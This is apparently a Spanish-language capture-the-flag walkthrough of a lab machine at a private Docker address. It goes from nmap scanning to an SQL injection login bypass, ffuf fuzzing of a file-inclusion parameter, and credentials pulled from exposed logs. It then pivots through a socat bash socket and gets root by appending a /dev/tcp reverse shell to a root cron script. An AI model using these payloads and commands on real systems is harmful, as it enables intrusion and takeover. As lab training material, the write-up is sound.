
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --open --min-rate 5000 172.17.0.2 -oG nmap
nmap -sVC -p22,80 --min-rate 5000 172.17.0.2 -oG vers
```

Puertos abiertos:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | Apache 2.4.58 — redirige a `/login.php` |

---

## 2. SQLi en el panel de login

Al acceder a `http://172.17.0.2` el servidor redirige directamente a `/login.php`, que presenta un formulario POST básico sin protección CSRF.

Se prueba inyección SQL en el campo de contraseña:

```
Username: admin
Password: prueba' or '1'='1 -- -
```

El servidor acepta la inyección y redirige a `/index.php?page=welcome`, con sesión iniciada como `admin`.

---

## 3. Information disclosure — comentario en el código fuente

Al inspeccionar el HTML del panel de administración se encuentra este comentario:

```html
<!-- dev note: remember to secure logs.txt path before deploy -->
```

Además, el panel muestra el aviso:

```
[!] Warning: System error logs are exposed to the public folder
```

El parámetro `page` en la URL sugiere que el servidor incluye archivos dinámicamente. Se intenta acceder directamente a `logs.txt` pero no funciona — hay que encontrar la ruta exacta.

---

## 4. Fuzzing del parámetro page para localizar logs.txt

Se usa ffuf para probar directorios como prefijo dentro del parámetro `page`, pasando la cookie de sesión en cada petición. Primero se identifica el tamaño de la respuesta vacía (`-fs 43`) y se filtra:

```bash
ffuf -u "http://172.17.0.2/index.php?page=FUZZ/logs.txt" \
  -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -H "Cookie: PHPSESSID=6kbjtfrflpt8suak6c4057vvo4" \
  -fs 43
```

Resultado:

```
logs    [Status: 200, Size: 1639]
```

La ruta completa es `/index.php?page=logs/logs.txt`.

---

## 5. Extracción de credenciales del archivo de logs

```bash
curl "http://172.17.0.2/index.php?page=logs/logs.txt" \
  -H "Cookie: PHPSESSID=6kbjtfrflpt8suak6c4057vvo4"
```

El archivo contiene entradas de log con contraseñas en base64 y un login exitoso:

```
[2024-03-29 12:04:23] ERROR: Login attempt for user 'albert'
[2024-03-29 12:04:24] DEBUG: Trying password 'NGxiM3J0MTIz'
[2024-03-29 12:04:25] SUCCESS: Auth success for user 'albert'
```

La contraseña en el log está en base64, pero el sistema la acepta directamente sin decodificar — es la contraseña real tal cual aparece.

---

## 6. Acceso SSH como albert

```bash
ssh albert@172.17.0.2
# contraseña: NGxiM3J0MTIz

albert@cf95e16bd546:~$ whoami
albert
```

---

## 7. Pivote a conx — socket Unix con socat

En la enumeración de procesos se detecta:

```bash
ps aux
```

```
conx   54   socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
```

`socat` está escuchando en un socket Unix y ejecuta `/bin/bash` para cada conexión entrante, todo ello corriendo como el usuario `conx`. Cualquier proceso que pueda conectarse al socket obtiene una shell con ese usuario.

> **¿Qué es socat?** Es una herramienta que crea canales de comunicación entre dos puntos. En este caso conecta un socket Unix del filesystem con la ejecución de bash, creando efectivamente un "servidor de shell" local. Quien se conecte al socket obtiene una sesión interactiva como el usuario que lanzó el proceso.

```bash
socat - UNIX-CONNECT:/home/conx/.cache/.sock
id
# uid=1002(conx) gid=1002(conx) groups=1002(conx)
```

Se estabiliza la shell:

```bash
script /dev/null -c /bin/bash
export TERM=xterm
```

---

## 8. Escalada a root — cron + script escribible

Se inspeccionan las tareas cron:

```bash
cat /etc/cron.d/backup-cron
# * * * * * root bash /var/backups/backup.sh
```

Root ejecuta `/var/backups/backup.sh` cada minuto. Se comprueba quién puede escribir en ese archivo:

```bash
ls -la /var/backups/backup.sh
# -rw-rw-r-- 1 conx root 287 Sep 20 00:45 /var/backups/backup.sh
```

`conx` tiene permisos de escritura. Se añade una reverse shell al final del script:

```bash
echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" >> /var/backups/backup.sh
```

En el atacante se activa el listener:

```bash
nc -lvnp 4444
```

Al cabo de menos de un minuto llega la conexión:

```bash
root@cf95e16bd546:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cf95e16bd546:~# whoami
root
```
